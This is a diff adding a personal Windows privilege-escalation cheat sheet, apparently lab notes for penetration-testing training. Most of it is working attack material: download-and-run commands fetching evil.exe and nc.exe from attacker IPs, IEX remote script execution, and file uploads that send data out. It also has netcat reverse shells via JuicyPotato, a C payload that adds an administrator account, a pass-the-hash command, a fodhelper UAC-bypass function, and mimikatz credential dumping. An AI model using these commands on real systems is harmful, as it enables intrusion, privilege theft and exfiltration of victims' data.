@@ -1,0 +1,331 @@
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+Windows Priv  Escalation - - Hey you have shell no worry !!!, get root 
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+Ref: - Online workouts
+=======================================================================
+https://www.fuzzysecurity.com/tutorials/16.html
+https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html
+https://guif.re/windowseop#EoP%201:%20Incorrect%20permissions%20in%20services
+use exploit/windows/local/
+
+=========================================================================
+Powershell Location
+=========================================================================
+https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations
+
+
+=========================================================================
+Metterpreter autorun migrate
+=========================================================================
+set autorunscript /msf/scripts/migrate.rb winlogon.exee
+
+=========================================================================
+File Transfer  -> sometime it will stuck
+=========================================================================
+ftp -h
+open 192.168.100.50
+USER offsec
+toor
+bin
+GET nc.exe
+bye
+
+ftp -v -n -s:ftp.txt
+$ cd /ftphome
+
+=========================================================================
+Best tool for windows to transafer files
+=========================================================================
+echo strUrl = WScript.Arguments.Item(0) > wget.vbs
+echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
+echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
+echo Err.Clear >> wget.vbs
+echo Set http = Nothing >> wget.vbs
+echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
+echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wge
+t.vbs
+echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.
+vbs
+echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
+echo http.Open "GET", strURL, False >> wget.vbs
+echo http.Send >> wget.vbs
+echo varByteArray = http.ResponseBody >> wget.vbs
+echo Set http = Nothing >> wget.vbs
+echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
+echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
+echo strData = "" >> wget.vbs
+echo strBuffer = "" >> wget.vbs
+echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
+echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
+echo Next >> wget.vbs
+echo ts.Close >> wget.vbs
+
+cscript wget.vbs http://10.11.0.4/evil.exe evil.exe
+
+
+=========================================================================
+Powershell - file transfer  - oneline is powerfull tool
+=========================================================================
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'new-exploit.exe')
+powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1')
+
+echo $webclient = New-Object System.Net.WebClient >>wget.ps1
+echo $url = "http://192.168.119.244/nc.exe" >>wget.ps1
+echo $file = "nc.exe" >>wget.ps1
+echo $webclient.DownloadFile($url,$file) >>wget.ps1
+
+=========================================================================
+Tasffering bigger files
+=========================================================================
+upx -9 nc.exe
+exe2hex -x nc.exe -p nc.cmd
+cat nc.cmd | xclip -selection clipboard
+paste in reverseshell cmd
+
+=========================================================================
+Uploading a File
+=========================================================================
+upload.php  --> host in appache server
+  <?php
+$uploaddir = '/var/www/html/upload/';
+$uploadfile = $uploaddir . $_FILES['file']['name'];
+move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
+?>
+
+powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.119.244/upload.php', 'seceret.txt')
+
+=========================================================================
+windows server 2008
+=========================================================================
+
+start the deamon
+ $ atftpd --daemon --port 69 /tftp
+tftp -i 10.11.0.4 put important.docx
+
+==================================================================================================================
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+=============================================================
+Manual Cheatsheets
+=============================================================
+whoami
+whoami /priv
+net user username
+net user
+hostname
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+tasklist /SVC
+ipconfig /all
+route print
+netstat -ano
+netstat -anpb TCP
+netsh advfirewall show currentprofile
+netsh advfirewall firewall show rule name=all
+schtasks /query /fo LIST /v
+wmic qfe get Caption, Description, HotFixID, InstalledOn /output:c:\inetpub\hotfixes.txt
+wmic product get name,version /output:c:\inetpub\InstalledSoftwareList.txt
+accesschk.exe -uws "Everyone" "C:\Program Files"
+Get-ChildItem "C:\Program Files" -R ecurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
+mountvol
+powershell.exe driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path
+Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
+
+Elevated prvi checking
+=============================================================
+reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
+reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
+
+
+
+
+=============================================================
+UAC Bypass - Manual Exploit
+=============================================================
+https://www.hackingarticles.in/multiple-ways-to-bypass-uac-using-metasploit/
+window 10 -> foodhelper.exe 
+	sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe
+
+
+=============================================================
+Isecure file permssion - (service insecure file path)
+=============================================================
+Get-WmiObject win32_service | Select-Object Name, State, PathName| Where-Object {$_.State -like 'Running'}
+icalcs <service name> -> To find the permission
+   #include <stdlib.h>
+		int main ()
+		{
+		int i;
+		i = system ("net user evil Ev!lpass /add");
+		i = system ("net localgroup administrators evil /add");}
+		
+net stop <service name>
+wmic service where caption="Serviio" get name, caption, state, startmode
+shutdown /r /t 0 (to restart the machine, incase service is set to automatic)
+
+=============================================================
+Unquotted file path
+=============================================================
+wmic service get name,displayname,pathname,startmode |findstr /i “auto” |findstr /i /v “c:\windows\\” |findstr /i /v “””
+Get-WmiObject -class win32_service | SELECT PATHNAME
+
+=============================================================
+Potato 
+=============================================================
+JuicyPotato (sugared version of Rotenpot)
+  JuicyPotato.exe -l 9001 -p c:\inetpub\wwwroot\pots.exe -t * -c {C49E32C6-BC8B-11d2-85D4-00105A1F8304} (server 2012)
+  
+  JuicyPotato.exe -l 9001 -p  c:\windows\system32\cmd.exe -a "/c c:\inetpub\wwwroot\nc.exe 192.168.119.244 443 -e cmd" -t * -c {8BC3F05E-D86B-11D0-A075-00C04FB68820}
+  
+  https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
+
+-> Windows 7 Enterprise
+-> Windows 8.1 Enterprise
+-> Windows 10 Enterprise
+-> Windows 10 Professional
+-> Windows Server 2008 R2 Enterprise
+-> Windows Server 2012 Datacenter
+-> Windows Server 2016 Standard
+-> Weak File/Service permission
+
+=============================================================
+Services file permssion - bin path, file  replace
+=============================================================
+accessxp.exe /accepteula -uwcqv "Authenticated Users" *
+accessxp.exe /accepteula -uwcqv "Authenticated Users" C:\
+accessxp.exe /accepteula -uwcqv "Users" C:\
+accessxp.exe /accepteula -uwcqv "Everyone" C:\
+
+
+=============================================================
+Automated Scripts --> best tool to find the all path permission
+=============================================================  
+powershell -nop -ep bypass
+
+Import-Module .\PowerUp.ps1
+Invoke-AllChecks
+	'Get-ServiceUnquoted',
+    'Get-ServiceFilePermission',
+    'Get-ServicePermission',
+    'Get-ServiceDetail',
+    'Invoke-ServiceAbuse',
+    'Write-ServiceBinary',
+    'Install-ServiceBinary',
+    'Restore-ServiceBinary',
+    'Find-DLLHijack',
+    'Find-PathHijack',
+    'Write-HijackDll',
+    'Get-RegAlwaysInstallElevated',
+    'Get-RegAutoLogon',
+    'Get-VulnAutoRun',
+    'Get-VulnSchTask',
+    'Get-UnattendedInstallFile',
+    'Get-Webconfig',
+    'Get-ApplicationHost',
+    'Write-UserAddMSI',
+    'Invoke-AllChecks
+	
+beroot.exe
+privesec.ps1
+	-> Get-ServiceUnquoted -verbose
+	-> Get-ModifiableServiceFile -verbose
+	-> Get-ModifiableService -verbose
+	
+=============================================================
+Kernel Exploit
+=============================================================
+Sherlock.ps1
+ Import-Module .\Sherlock.ps1
+Find-AllVulns
+
+=============================================================
+Folder permission checker
+=============================================================
+icacls "C:\Program Files\A Subfolder
+
+
+=============================================================
+switch the users
+=============================================================
+runas /user:domainname\username program
+
+PsExec.exe -u Evil2 -p evil met.exe
+
+powershell -c "$username = 'Evil';$password = 'pass123';$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; Start-Process 'nc.exe' -Credential $credential -argumentlist '192.168.X.X 1337 -e cmd.exe'"
+
+=============================================================
+Pass the hash
+=============================================================
+pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
+
+
+=============================================================
+plink
+=============================================================
+cmd.exe /c echo y | plink.exe -ssh -l root -pw toor -R 192.168.119.244:9090:127.0.0.1:9090 192.168.119.244
+
+http://127.0.0.1:9090/
+
+
+=============================================================
+enable RDP -> reg add
+============================================================= 
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
+
+
+=============================================================
+Windows Privelscation tool
+=============================================================
+
+windows-privesc-check2.exe -a -D -e -F -H -I -k  -R -S -t -b --audit --dumptab -o priv
+
+Fgdump
+------------------------------------------------
+ 
+UACBypass -scripts
+-----------------------
+
+function FodhelperBypass(){ 
+ 
+Param (    
+ 
+ [String]$program = "C:\Users\Administrator\Desktop\rev.exe" #default
+ 
+      )
+ 
+#Create registry structure
+ 
+New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
+New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
+Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force
+ 
+#Perform the bypass
+Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
+ 
+#Remove registry structure
+Start-Sleep 3
+Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
+ 
+}
+=============================================================
+Active Directory
+=============================================================
+mimkatz.exe
+-----------
+privilege::debug
+log mimz.txt
+sekurlsa::logonPasswords full  --> if fails
+sekurlsa::minidump lsass_592.dmp
+
+
+
+
+
+
+
